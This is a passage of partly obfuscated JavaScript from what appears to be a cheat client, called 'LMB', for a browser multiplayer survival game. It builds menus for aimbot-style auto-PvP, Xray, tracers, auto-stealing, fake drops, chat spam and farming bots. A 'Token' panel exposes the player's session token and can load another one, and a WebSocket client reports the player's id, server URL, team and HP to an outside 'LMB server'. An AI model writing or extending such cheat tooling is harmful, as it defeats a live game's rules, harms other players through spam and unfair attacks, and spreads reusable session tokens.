          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.AutoSpike, "isSpikeInWater", {
          label: "isSpikeInWater"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
      }
      {
        const folder = autowallFolder;
        const keyBindButton = folder.addButton({
          title: Settings.AutoWall.k,
          label: "KeyBind"
        }).on("click", () => {
          __p_JN2z_UtilsUI_controls.setKeyBind("AutoWall", keyBindButton);
        });
        folder.addBinding(Settings.AutoWall, "IsFollowMouse", {
          label: "MouseAngle"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.AutoWall, "AngleSpread", {
          label: "AngleSpread"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
      }
      {
        const folder = autopvpFolder;
        const keyBindButton = folder.addButton({
          title: Settings.AutoPvP.k,
          label: "KeyBind"
        }).on("click", () => {
          __p_JN2z_UtilsUI_controls.setKeyBind("AutoPvP", keyBindButton);
        });
        folder.addBinding(temp, "autopvpLockId", {
          label: "lockId",
          min: 0,
          max: 100,
          step: 1
        });
        folder.addBinding(Settings.AutoPvP, "isPullWeapon", {
          label: "PullWeapon"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.AutoPvP, "isPullHelmet", {
          label: "PullHelmet"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.AutoPvP, "isAutoSpike", {
          label: "AutoSpike"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.AutoPvP, "is360", {
          label: "└─ is360"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
      }
      combatFolder.addBinding(Settings.FakeDropWeapon, "e", {
        label: "FakeDropWeapon"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
    }
    const mainFolder = gui.addFolder({
      title: "🔰 Main",
      expanded: false
    });
    {
      const folder = mainFolder;
      folder.addBinding(Settings.AutoBuyWood, "e", {
        label: "AutoBuyWood"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoBuyWood, "berryTrigger", {
        label: "└─ berryTrigger",
        min: 100,
        max: 5000,
        step: 100
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoBuyAllStone, "e", {
        label: "AutoBuyAllStone"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoBuyAllGold, "e", {
        label: "AutoBuyAllGold"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.ExtractorTake, "e", {
        label: "ExtTake"
      });
      const ExtTakeKeyBindButton = folder.addButton({
        title: Settings.ExtractorTake.k,
        label: "└─ KeyBind"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("ExtractorTake", ExtTakeKeyBindButton);
      });
      folder.addBinding(Settings.ExtractorPut, "e", {
        label: "ExtPut"
      });
      const ExtPutKeyBindButton = folder.addButton({
        title: Settings.ExtractorPut.k,
        label: "└─ KeyBind"
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("ExtractorPut", ExtPutKeyBindButton);
      });
      folder.addBinding(Settings.AutoBreadTake, "e", {
        label: "BreadTake"
      });
      const BreadTakeKeyBindButton = folder.addButton({
        title: Settings.AutoBreadTake.k,
        label: "└─ KeyBind"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoBreadTake", BreadTakeKeyBindButton);
      });
      folder.addBinding(Settings.AutoBreadPut, "e", {
        label: "BreadPut"
      });
      const BreadPutKeyBindButton = folder.addButton({
        title: Settings.AutoBreadPut.k,
        label: "└─ KeyBind"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoBreadPut", BreadPutKeyBindButton);
      });
      folder.addBinding(Settings.AutoBuild, "e", {
        label: "AutoBuild 🏗️"
      });
      const autobuldKeyBindButton = folder.addButton({
        title: Settings.AutoBuild.k,
        label: "└─ KeyBind"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoBuild", autobuldKeyBindButton);
      });
      folder.addBinding(Settings.AutoIce, "e", {
        label: "AutoIce 🧊"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoIce, "iceHealTriggerAmount", {
        label: "└─ iceHealAmt",
        min: 0,
        max: 500,
        step: 10
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoCrown, "e", {
        label: "AutoCrown 👑"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoCrown, "health_to_activate", {
        label: "└─ activationHp",
        min: 10,
        max: 200,
        step: 5
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoCraftSpikes, "e", {
        label: "AutoCraftSpike"
      });
      const autoCraftSpikesKeyBindButton = folder.addButton({
        title: Settings.AutoCraftSpikes.k,
        label: "├─ KeyBind"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoCraftSpikes", autoCraftSpikesKeyBindButton);
      });
      folder.addBinding(Settings.AutoCraftSpikes, "p", {
        label: "└─ Mode",
        options: {
          ["Highest Craftale"]: "Highest Craftale",
          ["Reidite Spike"]: "Reidite Spike",
          ["Amethyst Spike"]: "Amethyst Spike",
          ["Diamond Spike"]: "Diamond Spike",
          ["Gold Spike"]: "Gold Spike",
          ["Stone Spike"]: "Stone Spike",
          ["Wood Spike"]: "Wood Spike"
        }
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      const autochestFolder = folder.addFolder({
        title: "AutoChest",
        expanded: false
      });
      {
        const folder = autochestFolder;
        folder.addBinding(Settings.AutoTakeChest, "e", {
          label: "TakeChest"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(temp, "invIdToTake", {
          label: "└─ invId",
          min: 0,
          max: 355,
          step: 1
        }).on("change", event => {
          Settings.ChestInfo.isShowInvId = true;
          if (timeoutInvId) {
            workerTimers.clearTimeout(timeoutInvId);
          }
          timeoutInvId = workerTimers.setTimeout(() => {
            Settings.ChestInfo.isShowInvId = false;
            timeoutInvId = null;
          }, 10000);
        });
        folder.addButton({
          title: "ADD ➕"
        }).on("click", event => {
          if (!Settings.AutoTakeChest.invIds.includes(temp.invIdToTake)) {
            Settings.AutoTakeChest.invIds.push(temp.invIdToTake);
            __p_JN2z_UtilsUI_saveSettings();
          }
        });
        folder.addButton({
          title: "RESET 🔄"
        }).on("click", () => {
          Settings.AutoTakeChest.invIds = [];
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addButton({
          title: "ADD Stone🪨 + Gold🟨 + Diamond🔷"
        }).on("click", event => {
          if (!Settings.AutoTakeChest.invIds.includes(INV.STONE)) {
            Settings.AutoTakeChest.invIds.push(INV.STONE);
          }
          if (!Settings.AutoTakeChest.invIds.includes(INV.GOLD)) {
            Settings.AutoTakeChest.invIds.push(INV.GOLD);
          }
          if (!Settings.AutoTakeChest.invIds.includes(INV.DIAMOND)) {
            Settings.AutoTakeChest.invIds.push(INV.DIAMOND);
          }
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBlade({
          view: "separator"
        });
        folder.addBinding(Settings.AutoPutChest, "e", {
          label: "PutChest"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(temp, "invIdToPut", {
          label: "└─ invId",
          min: 0,
          max: 355,
          step: 1
        }).on("change", event => {
          Settings.ChestInfo.isShowInvId = true;
          if (timeoutInvId) {
            workerTimers.clearTimeout(timeoutInvId);
          }
          timeoutInvId = workerTimers.setTimeout(() => {
            Settings.ChestInfo.isShowInvId = false;
            timeoutInvId = null;
          }, 10000);
        });
        folder.addButton({
          title: "ADD ➕"
        }).on("click", event => {
          if (!Settings.AutoPutChest.invIds.includes(temp.invIdToPut)) {
            Settings.AutoPutChest.invIds.push(temp.invIdToPut);
            __p_JN2z_UtilsUI_saveSettings();
          }
        });
        folder.addButton({
          title: "RESET 🔄"
        }).on("click", () => {
          Settings.AutoPutChest.invIds = [];
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addButton({
          title: "ADD Stone🪨 + Gold🟨 + Diamond🔷"
        }).on("click", () => {
          if (!Settings.AutoPutChest.invIds.includes(INV.STONE)) {
            Settings.AutoPutChest.invIds.push(INV.STONE);
          }
          if (!Settings.AutoPutChest.invIds.includes(INV.GOLD)) {
            Settings.AutoPutChest.invIds.push(INV.GOLD);
          }
          if (!Settings.AutoPutChest.invIds.includes(INV.DIAMOND)) {
            Settings.AutoPutChest.invIds.push(INV.DIAMOND);
          }
          __p_JN2z_UtilsUI_saveSettings();
        });
      }
    }
    const smartCraftFolder = gui.addFolder({
      title: "🛠️ SmartCraft",
      expanded: false
    });
    guiControls.SmartCraft = smartCraftFolder;
    {
      smartCraftFolder.addBinding(temp.smartCraft, "mode", {
        label: "📦 Mode",
        options: {
          ["Reditie Spike"]: INV.REIDITE_SPIKE,
          ["Reditie Wall"]: INV.REIDITE_WALL,
          ["Reidite Door Spike"]: INV.REIDITE_DOOR_SPIKE,
          ["Reidite Door"]: INV.REIDITE_DOOR,
          Roof: INV.ROOF,
          Bridge: INV.BRIDGE,
          ["Berry Seed"]: INV.BERRY_SEED
        }
      }).on("change", event => {
        temp.smartCraft.amount = 100;
        smartCraftFolder.refresh();
      });
      smartCraftFolder.addBinding(temp.smartCraft, "amount", {
        label: "🔢 Amount",
        min: 1,
        max: 100,
        step: 1
      });
      const smartcraftButton = smartCraftFolder.addButton({
        title: Settings.SmartCraft.e ? "⏸️ Pause" : "⚙️ Start Crafting"
      });
      smartCraftFolder.updateStatus = () => {
        if (Settings.SmartCraft.e) {
          smartcraftButton.title = "⏸️ Pause";
        } else {
          smartcraftButton.title = "⚙️ Start Crafting";
        }
      };
      smartcraftButton.on("click", () => {
        Settings.SmartCraft.e = !Settings.SmartCraft.e;
        smartCraftFolder.updateStatus();
      });
    }
    const miscFolder = gui.addFolder({
      title: "🌀 Misc",
      expanded: false
    });
    {
      const folder = miscFolder;
      const bulkitemsKeyBindButton = folder.addButton({
        title: Settings.BulkItems.k,
        label: "putManyItems"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("BulkItems", bulkitemsKeyBindButton);
      });
      folder.addBinding(Settings.BulkItems, "amount", {
        label: "└─ Amount",
        min: 50,
        max: 2000,
        step: 50
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.SpamChat, "e", {
        label: "SpamChat 💬"
      }).on("change", _param_526 => {
        if (_param_526.value) {
          SpamChat();
        }
      });
      folder.addBinding(Settings.SpamChat, "message", {
        label: "└─ Message"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoFood, "e", {
        label: "AutoFood"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoDrink, "autoEatWatermelon", {
        label: "Auto 🍉"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoDiving, "e", {
        label: "AutoDiving 🤿"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoPilot, "e", {
        label: "AutoPilot ✈️"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoPirateHat, "e", {
        label: "autoPirHat 🏴‍☠️"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoTame, "e", {
        label: "AutoTame 🐼"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AntiHood, "e", {
        label: "AntiHood (Pitchfork)"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      const dropweaponKeyBindButton = folder.addButton({
        title: Settings.DropWeapon.k,
        label: "DropWeapon"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("DropWeapon", dropweaponKeyBindButton);
      });
      const autofireKeyBindButton = folder.addButton({
        title: Settings.AutoFire.k,
        label: "AutoFire 🔥"
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoFire", autofireKeyBindButton);
      });
      const autostealKeyBindButton = folder.addButton({
        title: Settings.AutoSteal.k,
        label: "AutoSteal"
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoSteal", autostealKeyBindButton);
      });
      const fakedropKeyBindButton = folder.addButton({
        title: Settings.FakeDrop.k,
        label: "FakeDrop"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("FakeDrop", fakedropKeyBindButton);
      });
      const autocraftButton = folder.addButton({
        label: "AutoCraft",
        title: Settings.AutoCraft.k
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoCraft", autocraftButton);
      });
      const autorecycleButton = folder.addButton({
        label: "AutoRecycle",
        title: Settings.AutoRecycle.k
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoRecycle", autorecycleButton);
      });
      const autototemKeyBindButton = folder.addButton({
        title: Settings.AutoTotem.k,
        label: "AutoTotem 🗿"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoTotem", autototemKeyBindButton);
      });
      const exitvechileKeyBindButton = folder.addButton({
        title: Settings.ExitVehicle.k,
        label: "ExitVehicle 🚗"
      }).on("click", event => {
        __p_JN2z_UtilsUI_controls.setKeyBind("ExitVehicle", exitvechileKeyBindButton);
      });
      const spectatorKeyBindButton = folder.addButton({
        title: Settings.Spectator.k,
        label: "Spectator 👀"
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("Spectator", spectatorKeyBindButton);
      });
      folder.addBinding(Settings, "Equiq", {
        label: "Equiq after place"
      });
      folder.addBinding(Settings.LockAngle, "e", {
        label: "LockAngle 📐"
      });
      folder.addBinding(Settings.LockAngle, "angle", {
        label: "└─ Angle",
        min: 0,
        max: 359,
        step: 5
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.SpamBuild, "e", {
        label: "SpamBuild"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoEme, "e", {
        label: "AutoEme Enabled"
      }).on("change", _param_528 => {
        if (_param_528.value) {
          const myPlayer = world.fast_units[user.uid];
          if (myPlayer) {
            AutoEme_currentIndex = getNearestIndex({
              x: myPlayer.x,
              y: myPlayer.y
            }, AutoEme_farmLocations);
          }
        }
      });
      const keyBindButton = folder.addButton({
        title: Settings.AutoEme.k,
        label: "└─ KeyBind"
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoEme", keyBindButton);
      });
    }
    const translatorFolder = gui.addFolder({
      title: "🈳 Translator",
      expanded: false
    });
    {
      const folder = translatorFolder;
      folder.addBinding(Settings.Translator, "OutgoingMessage", {
        label: "Your Messages"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.Translator, "TranslateTo", {
        label: "└─ Language",
        options: languages
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.Translator, "IncomingMessage", {
        label: "Other Messages"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.Translator, "MyLanguage", {
        label: "└─ Language",
        options: languages
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
    }
    const autofarmFolder = gui.addFolder({
      title: "🌾 AutoFarm",
      expanded: false
    });
    {
      const folder = autofarmFolder;
      const keyButton = folder.addButton({
        label: "AutoFarm",
        title: Settings.AutoFarm.k
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("AutoFarm", keyButton);
      });
      folder.addBinding(Settings.AutoFarm, "e", {
        label: "Start AutoFarm"
      });
      folder.addBinding(Settings.AutoFarm, "water", {
        label: "AutoWater 🚿"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBlade({
        view: "separator"
      });
      folder.addBinding(Settings.AutoFarm, "dropBeri", {
        label: "AutoDrop ⬇️"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoFarm, "distance", {
        label: "Distance",
        min: 200,
        max: 1000,
        step: 50
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoFarm, "cmd", {
        label: "Command"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBlade({
        view: "separator"
      });
      folder.addButton({
        title: "Top Left of farm"
      }).on("click", () => {
        let _var_738 = world.fast_units[user.uid];
        if (_var_738) {
          Settings.AutoFarm.x = _var_738.x;
          Settings.AutoFarm.y = _var_738.y;
        }
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addButton({
        title: "Bottom Right of farm"
      }).on("click", () => {
        let myPlayer = world.fast_units[user.uid];
        if (myPlayer) {
          Settings.AutoFarm.xx = myPlayer.x;
          Settings.AutoFarm.yy = myPlayer.y;
        }
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addButton({
        title: "Safe Point"
      }).on("click", () => {
        let _var_b47 = world.fast_units[user.uid];
        if (_var_b47) {
          Settings.AutoFarm.sx = _var_b47.x;
          Settings.AutoFarm.sy = _var_b47.y;
        }
        __p_JN2z_UtilsUI_saveSettings();
      });
    }
    const lmbbotFolder = gui.addFolder({
      title: "🤖 LMBBot",
      expanded: false
    });
    {
      const folder = lmbbotFolder;
      folder.addBinding(Settings.SpikeCrafter, "e", {
        label: "SpikeCrafter"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.SpikeCrafter, "target", {
        label: "└─ target",
        options: {
          ["Reditite Spike"]: "Reidite Spike",
          ["Amethyst Spike"]: "Amethyst Spike",
          ["Diamond Spike"]: "Diamond Spike",
          ["Gold Spike"]: "Gold Spike",
          ["Stone Spike"]: "Stone Spike",
          ["Wood Spike"]: "Wood Spike"
        }
      });
      folder.addBinding(Settings.SyncToPlayer, "e", {
        label: "SyncToPlayer"
      });
      folder.addBinding(Settings.SyncToPlayer, "targetId", {
        label: "├─ targetId",
        min: 0,
        max: 100,
        step: 1
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addButton({
        title: "SET",
        label: "└─ SET nearest"
      }).on("click", () => {
        let _var_a54 = world.fast_units[user.uid];
        if (_var_a54) {
          const otherPlayers = world.units[ITEMS.PLAYERS].filter(p => {
            return p.pid !== _var_a54.pid;
          });
          const nearest = otherPlayers.reduce((_param_535, _param_534) => {
            if (Utils.dist(_var_a54, _param_534) < Utils.dist(_var_a54, _param_535)) {
              return _param_534;
            } else {
              return _param_535;
            }
          }, otherPlayers[0]);
          if (nearest) {
            Settings.SyncToPlayer.targetId = nearest.pid;
            __p_JN2z_UtilsUI_saveSettings();
            gui.refresh();
          }
        }
      });
    }
    const communityFolder = gui.addFolder({
      title: "🌍 Community",
      expanded: false
    });
    {
      const folder = communityFolder;
      folder.addBinding(Settings.AutoBottleZMA, "e", {
        label: "AutoBottleZMA"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoBottleZMA, "hpForItemActivation", {
        label: "└─ hpItemUse",
        min: 20,
        max: 100,
        step: 1
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoHamCmty, "e", {
        label: "AutoHammer (SuperHammer)"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.AutoGreenCrownCmty, "e", {
        label: "AutoGreenCrown"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
    }
    const tokenFolder = gui.addFolder({
      title: "🔑 Token",
      expanded: false
    });
    {
      const folder = tokenFolder;
      folder.addBinding(Settings.Token, "token", {
        label: "Token"
      });
      folder.addBinding(Settings.Token, "token_id", {
        label: "Token ID"
      });
      folder.addButton({
        title: "SET Token"
      }).on("click", () => {
        SetToken();
      });
      folder.addButton({
        title: "GET Token"
      }).on("click", () => {
        prompt("Copy this", "```Token: " + user.token + "\nTokenID: " + user.token_id + "```");
      });
    }
  };
  let __p_JN2z_UtilsUI_controls = null;
  let __p_JN2z_UtilsUI_controller = class {
    setKeyBind(propertyName, uiControl) {
      if (!Settings[propertyName] || typeof Settings[propertyName].k === "undefined") {
        console.error("Setting property \"" + propertyName + "\" or its 'k' property not found.");
        return;
      }
      Settings[propertyName].k = "Press any key";
      uiControl.title = "Press any key";
      const keydownListener = event => {
        let newKeyValue;
        if (event.code === "Escape") {
          newKeyValue = "NONE";
        } else {
          newKeyValue = event.code;
        }
        Settings[propertyName].k = newKeyValue;
        uiControl.title = newKeyValue;
        document.removeEventListener("keydown", keydownListener);
        __p_JN2z_UtilsUI_saveSettings();
      };
      document.addEventListener("keydown", keydownListener);
    }
  };
  let __p_JN2z_UtilsUI_saveSettings = () => {
    for (let HACK in Settings) {
      localStorage.setItem(HACK + "lmb4", JSON.stringify(Settings[HACK]));
    }
  };
  let __p_JN2z_UtilsUI_loadSettings = () => {
    for (let HACK in Settings) {
      try {
        let data = localStorage.getItem(HACK + "lmb4");
        if (data) {
          let parsedData = JSON.parse(data);
          function mergeDefaultsStrict(defaults, saved) {
            if (typeof defaults === "object" && defaults !== null && !Array.isArray(defaults)) {
              const result = {};
              for (let key in defaults) {
                const defVal = defaults[key];
                const savedVal = saved?.[key];
                result[key] = mergeDefaultsStrict(defVal, savedVal);
              }
              return result;
            }
            if (saved !== undefined) {
              return saved;
            } else {
              return defaults;
            }
          }
          Settings[HACK] = mergeDefaultsStrict(Settings[HACK], parsedData);
        }
      } catch (error) {
        console.error("LMB: Failed to load setting for " + HACK + ":", error);
        localStorage.removeItem(HACK + "lmb4");
      }
    }
  };
  let __p_JN2z_UtilsUI_LoadHack = () => {
    __p_JN2z_UtilsUI_loadSettings();
    Settings.SpamChat.e = false;
    Settings.AutoSpike.e = false;
    Settings.AutoWall.e = false;
    Settings.AutoPvP.e = false;
    Settings.AutoCraft.e = false;
    Settings.AutoRecycle.e = false;
    Settings.Xray.e = false;
    Settings.AutoFarm.e = false;
    Settings.Spectator.e = false;
    Settings.AutoCraftSpikes.e = false;
    Settings.AutoSteal.e = false;
    Settings.FakeDrop.e = false;
    Settings.AutoFire.e = false;
    Settings.AimbotSpike.e = false;
    Settings.AutoBuild.e = false;
    Settings.ExitVehicle.e = false;
    Settings.HideScript.e = false;
    Settings.LockAngle.e = false;
    Settings.MuteEnemyChat.e = false;
    Settings.SyncToPlayer.e = false;
    Settings.AutoEme.e = false;
    Settings.ListEnabledHacks.e = true;
    Settings.ShowGauges.e = true;
    Settings.ShowFPS.e = true;
    Settings.ShowPing.e = true;
    Settings.ColoredSpike.e = true;
    Settings.ChestInfo.e = true;
    Settings.Tracers.e = true;
    Settings.Translator.e = true;
    Settings.DrawHpInMyPlayer.e = true;
    Settings.DrawTimerInPlayer.e = true;
    Settings.DrawTimerInPlayer.isInMyPlayer = true;
    Settings.DrawTimerInPlayer.isInOthers = true;
    Settings.VisualHp.e = true;
    Settings.VisualHp.player = true;
    Settings.VisualHp.animal = true;
    Settings.VisualHp.box = true;
    Settings.HoodTimer.e = true;
    Settings.AutoBook.e = true;
    Settings.AutoDrink.e = true;
    Settings.AutoKsDeadBox.e = false;
    Settings.ChestInfo.isShowInvId = false;
    __p_JN2z_UtilsUI_controls = new __p_JN2z_UtilsUI_controller();
    __p_JN2z_UtilsUI_initUI(guiTheme[Settings.HackTheme]);
  };
  function LMBNetworkClient() {
    this.socket = null;
    let self = this;
    this.connect = function () {
      this.socket = new WebSocket(Settings.lmbServerUrl + "/ws");
      this.socket.onopen = () => {
        console.log("Connected to the LMB server.");
        let data = {
          id: user.id,
          url: extractBaseUrl(client.socket.url),
          team_id: Settings.teamId,
          team: user.team,
          hp: user.gauges.l * 200
        };
        self.sendMessage("handshake", data);
      };
      this.socket.onmessage = event => {
        const message = JSON.parse(event.data);
        switch (message.type) {
          case "test":
            console.log("Server: ", message.data);
            break;
          case "hp":
            const data = message.data;
            hpFromServer[id] = data.hp;
            break;
        }
      };
      this.socket.onclose = () => {
        console.log("Disconnected from the LMB server.");
        hpFromServer = {};
      };
      this.socket.onerror = _param_538 => {
        console.error("LMB WebSocket Error:", _param_538);
      };
    };
    this.sendMessage = function (type, data) {
      const message = {
        type: type,
        data: data
      };
      if (this.socket && this.socket.readyState === WebSocket.OPEN) {
        this.socket.send(JSON.stringify(message));
      } else {
        console.error("Socket is not open.");
      }
    };
    this.send_update_hp = function (hp) {
      let payload = {
        hp: hp
      };
      self.sendMessage("update_hp", payload);
    };
    this.send_update_team = function (team) {
      let payload = {
        new_team: team
      };
      self.sendMessage("update_team", payload);
    };
    this.send_update_team_id = function (teamId) {
      this.sendMessage("team_id", teamId);
    };
  }
  function countOccurrences(mainString, subString) {
    if (subString === "") {
      return 0;
    }
    let count = 0;
    let position = 0;
    while ((position = mainString.indexOf(subString, position)) !== -1) {
      count++;
      position += subString.length;
    }
    return count;
  }
  function HoldWeapon(right, hammerAndHand) {
    switch (right) {
      case INV.REIDITE_SPEAR:
      case INV.CRAB_SPEAR:
      case INV.AMETHYST_SPEAR:
      case INV.DIAMOND_SPEAR:
      case INV.GOLD_SPEAR:
      case INV.STONE_SPEAR:
      case INV.WOOD_SPEAR:
      case INV.DRAGON_SPEAR:
      case INV.LAVA_SPEAR:
      case INV.COPPER_SPEAR:
      case INV.IRON_SPEAR:
      case INV.TOPAZ_SPEAR:
      case INV.SAPPHIRE_SPEAR:
      case INV.JADE_SPEAR:
      case INV.RUBY_SPEAR:
      case INV.COAL_SPEAR:
      case INV.AQUAMARINE_SPEAR:
      case INV.EMERALD_SPEAR:
        return 2;
      case INV.WOOD_SWORD:
      case INV.STONE_SWORD:
      case INV.COPPER_SWORD:
      case INV.IRON_SWORD:
      case INV.GOLD_SWORD:
      case INV.TOPAZ_SWORD:
      case INV.DIAMOND_SWORD:
      case INV.AMETHYST_SWORD:
      case INV.REIDITE_SWORD:
      case INV.PIRATE_SWORD:
      case INV.SAPPHIRE_SWORD:
      case INV.JADE_SWORD:
      case INV.RUBY_SWORD:
      case INV.COAL_SWORD:
      case INV.AQUAMARINE_SWORD:
      case INV.EMERALD_SWORD:
      case INV.DRAGON_SWORD:
      case INV.LAVA_SWORD:
      case INV.MACHETE:
        return 1;
      case INV.WOOD_BOW:
      case INV.STONE_BOW:
      case INV.COPPER_BOW:
      case INV.IRON_BOW:
      case INV.GOLD_BOW:
      case INV.TOPAZ_BOW:
      case INV.DIAMOND_BOW:
      case INV.AMETHYST_BOW:
      case INV.REIDITE_BOW:
      case INV.SAPPHIRE_BOW:
      case INV.JADE_BOW:
      case INV.RUBY_BOW:
      case INV.COAL_BOW:
      case INV.AQUAMARINE_BOW:
      case INV.EMERALD_BOW:
      case INV.DRAGON_BOW:
        return 3;
      case INV.WOOD_AXE:
      case INV.STONE_AXE:
      case INV.COPPER_AXE:
      case INV.IRON_AXE:
      case INV.GOLD_AXE:
      case INV.TOPAZ_AXE:
      case INV.DIAMOND_AXE:
      case INV.AMETHYST_AXE:
      case INV.REIDITE_AXE:
      case INV.SAPPHIRE_AXE:
      case INV.JADE_AXE:
      case INV.RUBY_AXE:
      case INV.COAL_AXE:
      case INV.AQUAMARINE_AXE:
      case INV.EMERALD_AXE:
        return 4;
      case INV.SUPER_HAMMER:
      case INV.STONE_HAMMER:
      case INV.GOLD_HAMMER:
      case INV.COPPER_HAMMER:
      case INV.IRON_HAMMER:
      case INV.GOLD_HAMMER:
      case INV.TOPAZ_HAMMER:
      case INV.DIAMOND_HAMMER:
      case INV.AMETHYST_HAMMER:
      case INV.REIDITE_HAMMER:
      case INV.SAPPHIRE_HAMMER:
      case INV.JADE_HAMMER:
      case INV.RUBY_HAMMER:
      case INV.COAL_HAMMER:
      case INV.AQUAMARINE_HAMMER:
      case INV.EMERALD_HAMMER:
        if (hammerAndHand) {
          return 5;
        }
      case -1:
        if (hammerAndHand) {
          return 6;
        }
    }
    return 0;
  }
  function EnemyToAttack(myPlayer, PlayerList, ignoredIds = []) {
    let nearest = null;
    let distSqrd = -1;
    let HoldingSpear = HoldWeapon(myPlayer.right, false) === 2 ? true : false;
    for (var i = 0, len = PlayerList.length, obj = null, distance = null; i < len; ++i) {
      obj = PlayerList[i];
      if (obj.pid === myPlayer.pid) {
        continue;
      }
      if (ignoredIds.includes(obj.pid)) {
        continue;
      }
      if (!obj.ally && myPlayer.fly === obj.fly && !obj.ghost) {
        distance = (myPlayer.x - obj.x) ** 2 + (myPlayer.y - obj.y) ** 2;
        if (HoldingSpear && distance < 330) {
          continue;
        }
        if (distSqrd === -1 || distance < distSqrd) {
          distSqrd = distance;
          nearest = obj;
        }
      }
    }
    return nearest;
  }
  function EnemyNearest(myPlayer, PlayerList) {
    let nearest = null;
    let distSqrd = -1;
    for (var i = 0, len = PlayerList.length, obj = null, d = null; i < len; ++i) {
      obj = PlayerList[i];
      if (obj.pid === myPlayer.pid) {
        continue;
      }
      if (!obj.ally && myPlayer.fly === obj.fly && !obj.ghost) {
